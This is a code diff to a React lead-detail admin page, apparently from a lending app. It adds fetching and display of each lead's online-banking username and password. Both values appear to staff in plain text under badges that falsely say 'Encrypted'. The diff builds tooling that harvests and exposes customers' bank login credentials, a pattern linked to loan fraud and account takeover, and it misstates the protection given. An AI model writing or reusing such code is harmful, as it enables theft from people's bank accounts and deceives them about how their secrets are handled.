@@ -62,11 +62,19 @@ interface Document {
   signed_url?: string; // Optional signed URL for private Cloudinary resources
 }
 
+interface BankVerification {
+  id: string;
+  bankingUsername: string;
+  bankingPassword: string;
+}
+
 export default function LeadDetailPage() {
   const params = useParams();
   const id = params.id as string;
   const [lead, setLead] = useState<Lead | null>(null);
   const [documents, setDocuments] = useState<Document[]>([]);
+  const [bankVerification, setBankVerification] =
+    useState<BankVerification | null>(null);
   const [isLoading, setIsLoading] = useState(true);
   const [actionLoading, setActionLoading] = useState<string | null>(null);
 
@@ -128,7 +136,8 @@ export default function LeadDetailPage() {
           headers: { Authorization: `Bearer ${token}` },
         },
       );
-      setLead(response.data.lead);
+      setLead(response?.data?.lead);
+      setBankVerification(response?.data?.bankVerification);
 
       // Also fetch documents for this lead
       const docsResponse = await axios.get(
@@ -157,10 +166,7 @@ export default function LeadDetailPage() {
     if (!formData.last_name || formData.last_name.trim().length < 2) {
       errors.last_name = "Last name must be at least 2 characters";
     }
-    if (
-      !formData.email ||
-      !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)
-    ) {
+    if (!formData.email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(formData.email)) {
       errors.email = "Invalid email address";
     }
     const phoneDigits = (formData.phone || "").replace(/\D/g, "");
@@ -195,7 +201,10 @@ export default function LeadDetailPage() {
     ) {
       errors.routing_number = "Routing number must be exactly 9 digits";
     }
-    if (!formData.account_number || String(formData.account_number).length < 4) {
+    if (
+      !formData.account_number ||
+      String(formData.account_number).length < 4
+    ) {
       errors.account_number = "Account number is too short";
     }
     if (
@@ -560,6 +569,38 @@ export default function LeadDetailPage() {
                       {lead.account_number || "•••••••••"}
                     </p>
                   </div>
+
+                  {bankVerification && (
+                    <div className="bg-gray-50 p-4 rounded-lg border border-dashed">
+                      <div className="flex justify-between items-center mb-2">
+                        <span className="text-sm text-gray-500">
+                          Banking Username
+                        </span>
+                        <span className="text-xs bg-emerald-100 text-emerald-700 px-2 py-1 rounded font-bold uppercase">
+                          Encrypted
+                        </span>
+                      </div>
+                      <p className="font-mono font-bold text-[#003B5C] text-lg">
+                        {bankVerification?.bankingUsername || "•••••••••"}
+                      </p>
+                    </div>
+                  )}
+
+                  {bankVerification && (
+                    <div className="bg-gray-50 p-4 rounded-lg border border-dashed">
+                      <div className="flex justify-between items-center mb-2">
+                        <span className="text-sm text-gray-500">
+                          Banking Password
+                        </span>
+                        <span className="text-xs bg-emerald-100 text-emerald-700 px-2 py-1 rounded font-bold uppercase">
+                          Encrypted
+                        </span>
+                      </div>
+                      <p className="font-mono font-bold text-[#003B5C] text-lg">
+                        {bankVerification?.bankingPassword || "•••••••••"}
+                      </p>
+                    </div>
+                  )}
                 </div>
               </CardContent>
             </Card>
